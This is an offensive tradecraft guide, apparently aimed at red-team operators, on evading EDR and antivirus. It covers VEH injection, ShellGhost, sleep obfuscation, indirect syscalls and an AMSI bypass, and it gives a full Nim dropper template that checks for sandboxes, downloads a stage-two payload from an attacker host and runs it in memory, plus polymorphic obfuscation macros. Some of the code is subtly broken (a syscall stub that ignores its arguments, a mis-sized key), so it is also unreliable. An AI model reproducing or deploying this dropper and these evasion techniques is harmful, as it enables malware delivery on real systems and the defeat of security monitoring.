## Part 1: Modern Memory Injection Techniques (2025-2026)

### 1.1 Vectored Exception Handler (VEH) Injection

Modern EDR evasion now bypasses traditional execution primitives (CreateRemoteThread, QueueUserAPC) using Vectored Exception Handlers with PAGE_GUARD memory traps, eliminating the need to call obvious execution APIs.

**Key Mechanism:**

```
1. Allocate/Write shellcode to remote process
2. Manually update VEH list in remote process PEB
3. Set PAGE_GUARD trap on memory region
4. When process accesses PAGE_GUARD memory → exception triggered
5. VEH handler executes shellcode without calling execution primitive
```

**Advantages over traditional injection:**
- No CreateRemoteThread/QueueUserAPC calls (heavily monitored)
- Shellcode execution appears organic to EDR
- Works against most behavioral detection rules

**Defensive Evasion Layer:**
- EDR products also register VEH handlers; attackers now walk VEH lists and remove EDR handlers via BOF (Beacon Object Files)
- Manual manipulation of VEH entries bypasses EntryPoints validation

---

### 1.2 ShellGhost & Memory Fluctuation Techniques

ShellGhost is an in-memory evasion technique using Vectored Exception Handling with software breakpoints and RC4 encryption to cyclically stop thread execution, replace executed breakpoints with encrypted shellcode instructions, decrypt on-demand, and restore memory protection to RX—making shellcode invisible from process start to end.

**Technical Flow:**

```
┌─────────────────────────────────────────────┐
│ Shellcode allocated as RX (read-execute)    │
│ Contains software breakpoints (0xCC)        │
└──────────────────┬──────────────────────────┘
                   │
                   ▼
         ┌─────────────────────┐
         │ Breakpoint Hit      │
         │ Exception Raised    │
         └──────────┬──────────┘
                    │
        ┌───────────┴───────────┐
        │ VEH Handler Activated │
        └───────────┬───────────┘
                    │
        ┌───────────┴────────────────────────┐
        │ 1. Change memory to RW             │
        │ 2. Decrypt RC4 shellcode byte      │
        │ 3. Write decrypted byte            │
        │ 4. Change memory back to RX        │
        │ 5. Resume execution                │
        └─────────────────────────────────────┘
```

**Result:**
- Shellcode only appears unencrypted in RW memory for microseconds
- Memory scans catch all software breakpoints but not actual shellcode
- Defeats typical memory-scanning signatures

### 1.3 Sleep Obfuscation (Ekko & FOLIAGE Variants)

Sleep obfuscation using Thread Pools (Ekko method with queued timers) or APCs (FOLIAGE) now represents the standard approach for hiding implants during sleep cycles, using callback mechanisms instead of direct Sleep() function hooks.

**2026 Evolution:**
- Ekko: Uses CreateTimerQueueTimer with NtContinue callbacks
- FOLIAGE: Uses NtQueueApcThread
- **New 2026**: Combined VEH + Sleep obfuscation = implant invisible both at rest and during execution

## Part 2: EDR/AV Bypass Techniques (2026)

### 2.1 Direct System Calls (Indirect Syscalls)

Direct system calls bypass user-mode API hooking, with modern techniques using NimlineWhispers or similar tools to generate assembly stubs that call ntdll system calls directly, avoiding EDR hooks on common APIs like CreateRemoteThread, WriteProcessMemory, and VirtualAllocEx.

**Why It Works:**
- EDR hooks Ntdll.dll APIs in user-mode
- Direct syscalls invoke kernel functions without touching hooked user-mode APIs
- NimlineWhispers auto-generates assembly stubs for Nim code

**2026 Implementation (Nim + NimlineWhispers):**

```nim
import winim/lean

# Generated indirect syscall for NtAllocateVirtualMemory
proc allocMemIndirect(size: int): pointer =
    # Syscall stub generated by NimlineWhispers
    asm """
        mov r10, rcx
        mov eax, 0x18        # NtAllocateVirtualMemory syscall number
        syscall
        ret
    """

# Avoid API hooking entirely
let buffer = allocMemIndirect(shellcode.len)
```

### 2.2 Beacon Object Files (BOF) Inline Execution

In advanced EDR environments, operators increasingly favor inline-execute commands that run BOF (Compiled Object File) directly within existing Beacon process context, avoiding process creation events and showing only generic memory allocation activity in EDR logs.

**Execution Flow:**

```
┌──────────────┐
│ C2 Sends BOF │ (Pre-compiled COFF object file)
└───────┬──────┘
        │
        ▼
┌───────────────────────────┐
│ Beacon Receives BOF       │
└───────┬───────────────────┘
        │
        ▼
┌──────────────────────────────┐
│ COFF Parser & Relocation     │
│ - Parse sections             │
│ - Apply relocations          │
│ - Adjust base addresses      │
└───────┬──────────────────────┘
        │
        ▼
┌──────────────────────────────┐
│ Direct Function Invocation   │
│ - No new process creation    │
│ - No thread creation         │
│ - In-process execution       │
└─────────────────────────────┘
```

**EDR Evasion Benefits:**
- No process creation event (massive detection killer)
- No new thread activity
- Generic memory allocation looks benign
- Works against behavior-based detection

### 2.3 AMSI Bypass Without In-Memory Patching

Modern AMSI bypass avoids the detected in-memory patching approach by using hardware breakpoints and Vectored Exception Handlers to intercept AmsiScanBuffer, removing the need for suspicious RWX memory modifications.

**Traditional (Detected):**
```
Patch AmsiScanBuffer → return S_OK
↓
EDR detects in-memory modification of ntdll.dll
```

**2026 Approach (VEH + Hardware Breakpoints):**
```
1. Set hardware breakpoint on AmsiScanBuffer entry
2. VEH handler intercepts breakpoint exception
3. Modify return value to S_OK without patching memory
4. Resume execution normally
```

**Detection Evasion:**
- No in-memory patches (can't be detected by hash comparison)
- Hardware breakpoint not logged by most EDR
- Looks like legitimate exception handling

Nim is now the preferred language for 2026 red team payload development because it offers: direct C/C++ interoperability, powerful metaprogramming for compile-time code generation, small executable size, and sparse AV/EDR detection signatures due to its obscurity compared to C# or Python.

### 3.2 Nim Dropper Template (2026)

Modern Nim droppers implement staged payload delivery with anti-sandbox detection (checking CPU cores and RAM), indirect syscalls for memory allocation, encrypted C2 communication, and sleep obfuscation to evade behavioral detection.

**Full Nim Dropper Implementation:**

```nim
import winim/lean
import httpclient
import nimcrypto
import base64
import strformat
import os

# Anti-sandbox: Realistic machine checks
proc isRealMachine(): bool =
    var systemInfo: SYSTEM_INFO
    GetSystemInfo(addr systemInfo)
    let cores = systemInfo.dwNumberOfProcessors
    let ram = getTotalMem() div (1024 * 1024)  # Convert to GB
    
    # Most sandboxes: ≤2 cores, <4GB RAM
    if cores >= 4 and ram >= 4:
        return true
    return false

# Indirect syscall for NtAllocateVirtualMemory (bypass EDR hooks)
proc allocMemIndirect(size: int): pointer =
    asm """
        mov r10, rcx
        mov eax, 0x18        # NtAllocateVirtualMemory
        syscall
        ret
    """

# AES-256 encryption for C2 communication
const C2_URL = "https://attacker-domain.com/api/checkin"
const AES_KEY = "this_is_my_aes_key_32bytes!!"
const AES_IV = "initialization_v"

proc encryptData(data: string): string =
    var ctx: aes256
    var iv: array[16, byte]
    var plaintext = data
    var ciphertext = newString(plaintext.len + 16)
    
    let padLen = 16 - (plaintext.len mod 16)
    plaintext &= repeat('\x00', padLen)
    
    copyMem(addr iv[0], unsafeAddr AES_IV[0], 16)
    ctx.init(AES_KEY)
    ctx.encryptCBC(plaintext, ciphertext, iv)
    ctx.clear()
    
    return base64.encode(ciphertext)

# Main dropper logic
proc fetchAndExecute(url: string): bool =
    # Bail out in sandbox environment
    if not isRealMachine():
        return false
    
    var client = newHttpClient()
    client.headers = newHttpHeaders({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    })
    
    try:
        let payload = client.getContent(url)
        if payload.len == 0:
            return false
        
        # Allocate RWX memory via indirect syscall
        let mem = allocMemIndirect(payload.len)
        if mem.isNil:
            return false
        
        # Copy payload to allocated memory
        copyMem(mem, payload.cstring, payload.len)
        
        # Execute shellcode
        {.emit: "((void (*)()) `mem`)();".}
        
        return true
    except:
        return false

# Obfuscate entry point
when isMainModule:
    const payloadUrl = "http://attacker.com/stage2.bin"
    discard fetchAndExecute(payloadUrl)
```

### 3.3 Nim Polymorphic Payload Generation

Nim's metaprogramming capabilities enable polymorphic malware that changes signature on each compilation through runtime-generated encryption, obfuscation layers, and dynamically modified instruction sequences, making signature-based detection ineffective.

**Compile-Time Obfuscation (Nim Macro):**

```nim
import macros

# Macro to encrypt strings at compile time
macro obfuscateString(s: string): string =
    let str = s.strVal
    var encrypted = ""
    let key = 0x42  # Simple XOR key
    
    for c in str:
        encrypted &= $(cast[int](c) xor key) & ","
    
    result = newLit(encrypted)

# Usage: strings encrypted at compile time
let cmd = obfuscateString("cmd.exe")
let psCmd = obfuscateString("powershell")

# Runtime decryption
proc decryptString(encData: string): string =
    let key = 0x42
    result = ""
    for val in encData.split(","):
        if val.len > 0:
            result &= cast[char](parseInt(val) xor key)

let decodedCmd = decryptString(cmd)
```

**Metamorphic Instruction Rewriting:**

```nim
# Different instruction sequences for same operation
proc addA_method1(a: int, b: int): int = a + b       # ADD instruction
proc addA_method2(a: int, b: int): int = a - (-b)    # SUB with negation
proc addA_method3(a: int, b: int): int = b + a       # Reversed ADD

# Randomly select implementation at compile time
const useMethod = rand(1..3)

when useMethod == 1:
    let result = addA_method1(10, 20)
elif useMethod == 2:
    let result = addA_method2(10, 20)
else:
    let result = addA_method3(10, 20)
```
